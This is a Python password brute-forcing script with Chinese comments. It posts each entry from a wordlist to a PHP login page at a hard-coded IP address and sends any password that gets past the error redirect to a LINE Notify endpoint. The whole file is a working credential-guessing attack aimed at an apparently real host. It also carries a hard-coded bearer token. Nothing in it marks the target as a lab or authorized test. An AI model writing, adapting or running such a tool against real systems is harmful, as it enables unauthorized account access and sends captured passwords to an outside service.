import requests
import os
import sys

def line_send(msg):
    import requests
    headers = {
            "Authorization": "Bearer " + "TyuskDC9QBahGTMd9i3XynElMd9so3Y7GtscjI0OxHS",
            "Content-Type": "application/x-www-form-urlencoded"
        }
    params = {"message": ":~# " + str(msg)}
    r = requests.post("https://notify-api.line.me/api/notify", headers=headers, params = params)
    print(r.status_code)

r = requests.get('http://220.133.202.121/pths/fitness/convener.php')
res = "0"

file = sys.argv[1]
f = open(file) # 返回一個檔案物件
line = f.readline() # 呼叫檔案的 readline()方法

while line:
    passwd = line.strip()
    line = f.readline()
    playload = {"password":str(passwd)}
    resp = requests.post("http://220.133.202.121/pths/fitness/convener.php", playload)
    res = resp.url
    print("testing " + str(passwd))
    if res != "http://220.133.202.121/pths/fitness/error.php":
        print("finding " + str(passwd))
        line_send("finding " + str(passwd))

line_send("test finish")
